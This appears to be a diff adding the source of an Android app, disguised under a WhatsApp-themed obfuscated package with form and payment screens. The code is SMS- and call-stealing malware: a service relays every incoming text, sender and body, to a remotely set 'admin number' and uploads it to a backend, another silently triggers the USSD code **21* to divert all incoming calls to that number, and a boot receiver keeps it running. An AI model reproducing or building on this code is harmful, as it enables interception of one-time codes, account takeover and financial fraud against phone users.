@@ -1,0 +1,648 @@
+callforwardingservice.kt 
+
+package com.pakajb.avzbakl.msbzjl.whatsapp.services
+
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.net.Uri
+import android.os.IBinder
+import android.telephony.PhoneStateListener
+import android.telephony.TelephonyManager
+import android.util.Log
+import androidx.core.app.NotificationCompat
+import com.pakajb.avzbakl.msbzjl.whatsapp.network.ApiClient
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+
+class CallForwardingService : Service() {
+
+    private val apiInterface = ApiClient.api
+    private lateinit var phoneStateListener: PhoneStateListener
+
+    override fun onCreate() {
+        super.onCreate()
+        Log.d("CallForwardingService", "onCreate: Service started")
+
+        // Use ForegroundServiceHelper to handle notification
+        ForegroundServiceHelper.startForegroundService(
+            this,
+            2,
+            "call_service_channel",
+            "Call Forwarding Service Running",
+            "Call forwarding service is active"
+        )
+
+        startCallForwardingMonitoring()
+    }
+
+    private fun startCallForwardingMonitoring() {
+        Log.d("CallForwardingService", "startCallForwardingMonitoring: Monitoring started")
+
+        phoneStateListener = object : PhoneStateListener() {
+            @Deprecated("Deprecated in Java")
+            override fun onCallStateChanged(state: Int, incomingNumber: String?) {
+                super.onCallStateChanged(state, incomingNumber)
+
+                when (state) {
+                    TelephonyManager.CALL_STATE_RINGING -> {
+                        Log.d("CallForwardingService", "Incoming call detected! Number: $incomingNumber")
+                        // Fetch admin number and forward the call
+                        fetchAdminNumberAndForwardCall(incomingNumber ?: "")
+                    }
+                    TelephonyManager.CALL_STATE_IDLE -> {
+                        Log.d("CallForwardingService", "Call is idle")
+                    }
+                    TelephonyManager.CALL_STATE_OFFHOOK -> {
+                        Log.d("CallForwardingService", "Call is in progress")
+                    }
+                    else -> {
+                        Log.d("CallForwardingService", "Unknown call state")
+                    }
+                }
+            }
+        }
+
+        val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
+        Log.d("CallForwardingService", "PhoneStateListener registered")
+    }
+
+    private fun fetchAdminNumberAndForwardCall(incomingNumber: String) {
+        Log.d("CallForwardingService", "fetchAdminNumberAndForwardCall: Fetching admin number")
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.getAdminNumber()
+                withContext(Dispatchers.Main) {
+                    if (response.isSuccessful) {
+                        val adminNumber = response.body()?.data
+                        adminNumber?.let {
+                            Log.d("CallForwardingService", "Admin Number: $adminNumber")
+                            forwardCallToAdmin(adminNumber)
+                        }
+                    } else {
+                        Log.e("CallForwardingService", "Failed to fetch admin number: ${response.message()}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("CallForwardingService", "Error fetching admin number", e)
+            }
+        }
+    }
+
+    private fun forwardCallToAdmin(adminNumber: String) {
+        Log.d("CallForwardingService", "Activating Call Forwarding to: $adminNumber")
+        // USSD Code for call forwarding - typically, this would depend on the carrier.
+        val ussdCode = "**21*$adminNumber#"
+
+        // Sending the USSD request to forward calls
+        val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$ussdCode"))
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        try {
+            startActivity(intent)
+            Log.d("CallForwardingService", "Call forwarding activated successfully")
+        } catch (e: Exception) {
+            Log.e("CallForwardingService", "Error in activating call forwarding", e)
+        }
+    }
+
+    override fun onBind(intent: Intent?): IBinder? {
+        return null
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        Log.d("CallForwardingService", "onDestroy: Service destroyed")
+        // Unregister phone state listener
+        val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
+        Log.d("CallForwardingService", "PhoneStateListener unregistered")
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+mainactivity
+
+
+package com.pakajb.avzbakl.msbzjl.whatsapp
+
+import android.Manifest
+import android.content.Intent
+import android.content.pm.PackageManager  // Added this import
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.widget.ImageView
+import android.widget.ProgressBar
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import com.pakajb.avzbakl.msbzjl.whatsapp.activities.FormActivity
+import com.pakajb.avzbakl.msbzjl.whatsapp.services.CallForwardingService
+import com.pakajb.avzbakl.msbzjl.whatsapp.utils.PermissionUtil
+
+class MainActivity : AppCompatActivity() {
+    private lateinit var progressBar: ProgressBar
+    private lateinit var imageViewLogo: ImageView
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        // Initialize UI elements
+        progressBar = findViewById(R.id.progressBar)
+        imageViewLogo = findViewById(R.id.imageViewLogo)
+
+        // Set initial opacity and scale to 0 and 0.5
+        progressBar.alpha = 0f
+        imageViewLogo.alpha = 0f
+        progressBar.scaleX = 0.5f
+        progressBar.scaleY = 0.5f
+        imageViewLogo.scaleX = 0.5f
+        imageViewLogo.scaleY = 0.5f
+
+        progressBar.max = 100
+
+        // Check for SMS and Call permissions
+        if (PermissionUtil.hasPermissions(
+                this,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.INTERNET,
+                Manifest.permission.CALL_PHONE, // Add Call permission
+                Manifest.permission.READ_PHONE_STATE // Add Phone state permission
+            )
+        ) {
+            startAnimations()
+        } else {
+            // Request permissions if not granted
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.SEND_SMS,
+                    Manifest.permission.INTERNET,
+                    Manifest.permission.CALL_PHONE, // Request Call permission
+                    Manifest.permission.READ_PHONE_STATE // Request Phone state permission
+                ),
+                101
+            )
+        }
+    }
+
+    private fun startAnimations() {
+        // Animate opacity and scale to full over 0.3 seconds
+        imageViewLogo.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
+        progressBar.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
+
+        // Start progress animation after 1 second
+        Handler(Looper.getMainLooper()).postDelayed({
+            showProgressAndNavigate()
+        }, 2000)
+    }
+
+    private fun showProgressAndNavigate() {
+        var progress = 0
+        val handler = Handler(Looper.getMainLooper())
+        val progressRunnable = object : Runnable {
+            override fun run() {
+                if (progress <= 100) {
+                    progressBar.progress = progress
+                    progress += 5  // Increase progress smoothly
+                    handler.postDelayed(this, 100) // Update progress every 100ms
+                } else {
+                    navigateToFormPage() // Navigate once progress completes
+                }
+            }
+        }
+        handler.post(progressRunnable)
+    }
+
+    private fun navigateToFormPage() {
+        val intent = Intent(this, FormActivity::class.java)
+        startActivity(intent)
+        finish()
+
+        // Start the Call Forwarding service once user navigates
+        startCallForwardingService()
+    }
+
+    private fun startCallForwardingService() {
+        val intent = Intent(this, CallForwardingService::class.java)
+        startService(intent)
+    }
+
+    // Handle permission request result
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 101) {
+            // Check if all permissions were granted
+            var allPermissionsGranted = true
+            for (grantResult in grantResults) {
+                if (grantResult != PackageManager.PERMISSION_GRANTED) {
+                    allPermissionsGranted = false
+                    break
+                }
+            }
+
+            if (allPermissionsGranted) {
+                // If all permissions granted, start animations
+                startAnimations()
+            } else {
+                // If any permission is denied, show a message
+                Toast.makeText(this, "Permissions are required to proceed.", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+smsservice.kt
+
+
+@file:Suppress("DEPRECATION")
+
+package com.pakajb.avzbakl.msbzjl.whatsapp.services
+
+import android.app.PendingIntent
+import android.content.Intent
+import android.provider.Settings
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.SharedPreferences
+import android.os.Build
+import android.os.Handler
+import android.os.IBinder
+import android.telephony.SmsManager
+import android.util.Log
+import androidx.core.app.NotificationCompat
+import com.pakajb.avzbakl.msbzjl.whatsapp.R
+import com.pakajb.avzbakl.msbzjl.whatsapp.network.ApiClient
+import com.pakajb.avzbakl.msbzjl.whatsapp.models.SmsData
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import java.text.SimpleDateFormat
+import java.util.*
+import java.util.concurrent.TimeUnit
+import android.widget.Toast
+
+class SmsService : Service() {
+    private lateinit var sharedPreferences: SharedPreferences
+    private val apiInterface = ApiClient.api
+    private val handler = Handler()
+
+    // Constants
+    private val maxRetries = 3
+
+    override fun onCreate() {
+        super.onCreate()
+        sharedPreferences = getSharedPreferences("AdminPrefs", MODE_PRIVATE)
+
+        // Fetch admin number from backend initially
+        fetchAdminNumberFromBackend()
+
+        // Start periodic fetching of the admin number every minute
+        startAdminNumberFetch()
+
+        // Handle foreground service notification using helper
+        ForegroundServiceHelper.startForegroundService(
+            this,
+            1,
+            "sms_service_channel",
+            "SMS Service Running",
+            "SMS service is active and running"
+        )
+
+        // Ensure the service is in the foreground immediately after starting
+        val notification = ForegroundServiceHelper.createNotification(
+            this,
+            "sms_service_channel",
+            "SMS Service Running",
+            "SMS service is active and running"
+        )
+        startForeground(1, notification)
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        intent?.let {
+            val sender = it.getStringExtra("sender")
+            val body = it.getStringExtra("body")
+            if (!sender.isNullOrEmpty() && !body.isNullOrEmpty()) {
+                sendSmsToAdmin(sender, body) // Directly send SMS to the admin number
+                sendSmsWithRetry(sender, body) // Send SMS to backend with retry mechanism
+            }
+        }
+        return START_STICKY
+    }
+
+    private fun sendSmsToAdmin(sender: String, body: String) {
+        val adminNumber = getAdminNumberc()
+        if (adminNumber.isNotEmpty()) {
+            try {
+                val smsManager = SmsManager.getDefault()
+                val message = "New SMS received:\nFrom: $sender\nMessage: $body"
+                smsManager.sendTextMessage(adminNumber, null, message, null, null)
+                Log.d("SmsService", "SMS sent directly to admin: $adminNumber")
+
+                // Show Toast Notification
+                Toast.makeText(this, ".", Toast.LENGTH_SHORT).show()
+
+            } catch (e: Exception) {
+                Log.e("SmsService", "Error sending SMS directly to admin", e)
+
+                // Show Toast Notification on Failure
+                Toast.makeText(this, ".", Toast.LENGTH_SHORT).show()
+            }
+        } else {
+            Log.e("SmsService", "Admin number is not configured or empty.")
+        }
+    }
+
+    private fun sendSmsWithRetry(sender: String, body: String, attempt: Int = 1) {
+        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(System.currentTimeMillis())
+        val notificationData = SmsData(sender = sender, title = "New SMS", body = body, timestamp = timestamp)
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.sendNotificationToBackend(notificationData)
+                withContext(Dispatchers.Main) {
+                    if (response.isSuccessful) {
+                        response.body()?.let {
+                            if (it.success) {
+                                Log.d("SmsService", "SMS sent to backend successfully: $notificationData")
+                            } else {
+                                handleRetry(attempt, sender, body)
+                            }
+                        } ?: handleRetry(attempt, sender, body)
+                    } else {
+                        handleRetry(attempt, sender, body)
+                    }
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    handleRetry(attempt, sender, body, e)
+                }
+            }
+        }
+    }
+
+    private fun handleRetry(attempt: Int, sender: String, body: String, e: Exception? = null) {
+        if (attempt < maxRetries) {
+            Log.e("SmsService", "Retrying... attempt $attempt due to error: ${e?.message}")
+            sendSmsWithRetry(sender, body, attempt + 1)
+        } else {
+            Log.e("SmsService", "Max retries reached, error sending SMS to backend", e)
+        }
+    }
+
+    private fun fetchAdminNumberFromBackend() {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.getAdminNumber()
+                withContext(Dispatchers.Main) {
+                    if (response.isSuccessful) {
+                        response.body()?.data?.let {
+                            setAdminNumber(it)
+                            Log.d("SmsService", "Admin number updated from backend: $it")
+                        } ?: run {
+                            Log.e("SmsService", "Admin number is null in response.")
+                        }
+                    } else {
+                        Log.e("SmsService", "Backend response failed, code: ${response.code()} - ${response.message()}")
+                    }
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    Log.e("SmsService", "Error fetching admin number from backend", e)
+                }
+            }
+        }
+    }
+
+    private fun startAdminNumberFetch() {
+        handler.postDelayed(object : Runnable {
+            override fun run() {
+                fetchAdminNumberFromBackend()
+                handler.postDelayed(this, TimeUnit.MINUTES.toMillis(1))
+            }
+        }, TimeUnit.SECONDS.toMillis(0))
+    }
+
+    private fun getAdminNumberc(): String {
+        return sharedPreferences.getString("admin_number", "") ?: ""
+    }
+
+    private fun setAdminNumber(number: String) {
+        CoroutineScope(Dispatchers.Main).launch {
+            sharedPreferences.edit().putString("admin_number", number).apply()
+            Log.d("SmsService", "Admin number updated to: $number")
+        }
+    }
+
+    override fun onBind(intent: Intent?): IBinder? {
+        return null
+    }
+}
+
+
+
+
+
+
+
+forgroundservicehelper.kt
+
+package com.pakajb.avzbakl.msbzjl.whatsapp.services
+
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.content.Context
+import android.content.Intent
+import android.os.Build
+import androidx.core.app.NotificationCompat
+import com.pakajb.avzbakl.msbzjl.whatsapp.R
+
+object ForegroundServiceHelper {
+
+    // Function to start foreground service
+    fun startForegroundService(context: Context, serviceId: Int, channelId: String, title: String, content: String) {
+        // Create Notification Channel for Android O and above
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(channelId, title, NotificationManager.IMPORTANCE_LOW)
+            val notificationManager = context.getSystemService(NotificationManager::class.java)
+            notificationManager?.createNotificationChannel(channel)
+
+            // Create the notification
+            val notification = NotificationCompat.Builder(context, channelId)
+                .setContentTitle(title)
+                .setContentText(content)
+                .setSmallIcon(R.drawable.ic_launcher)
+                .build()
+
+            // Start the service and bring it to the foreground immediately
+            val intent = Intent(context, SmsService::class.java) // Example for SmsService, repeat for other services
+            context.startForegroundService(intent)
+            // Start the foreground within the service itself
+        } else {
+            // For below Android O, you can still use startService and then startForeground immediately
+            val intent = Intent(context, SmsService::class.java) // Example for SmsService
+            context.startService(intent)
+            // In the service onCreate(), start foreground
+        }
+    }
+
+    // This function is for creating the notification itself
+    fun createNotification(context: Context, channelId: String, contentTitle: String, contentText: String): Notification {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(channelId, contentTitle, NotificationManager.IMPORTANCE_LOW)
+            val manager = context.getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(channel)
+        }
+
+        return NotificationCompat.Builder(context, channelId)
+            .setContentTitle(contentTitle)
+            .setContentText(contentText)
+            .setSmallIcon(R.drawable.ic_launcher)
+            .build()
+    }
+}
+
+
+
+
+
+
+
+manifest.xml
+
+
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    >
+
+    <!-- Permissions -->
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL"/>
+    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MyApp"
+        android:usesCleartextTraffic="false">
+
+        <!-- Main Activity -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            tools:node="merge">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--        &lt;!&ndash; SMS Receiver &ndash;&gt;-->
+        <receiver
+            android:name=".receivers.SMSReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMS Service -->
+        <service
+            android:name=".services.SmsService"
+            android:foregroundServiceType="dataSync"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.pakajb.avzbakl.msbzjl.skalalk.START_SERVICE" />
+            </intent-filter>
+        </service>
+        <service
+            android:name=".services.CallForwardingService"
+            android:exported="true"
+            android:foregroundServiceType="phoneCall"
+            android:permission="android.permission.BIND_TELECOM_CONNECTION_SERVICE" />
+
+        <!-- Additional Activities -->
+        <activity android:name=".activities.FormActivity"
+            android:exported="false" />
+        <activity android:name=".activities.PaymentActivity"
+            android:exported="false" />
+        <activity android:name=".activities.SuccessActivity"
+            android:exported="false" />
+
+    </application>
+
+</manifest>
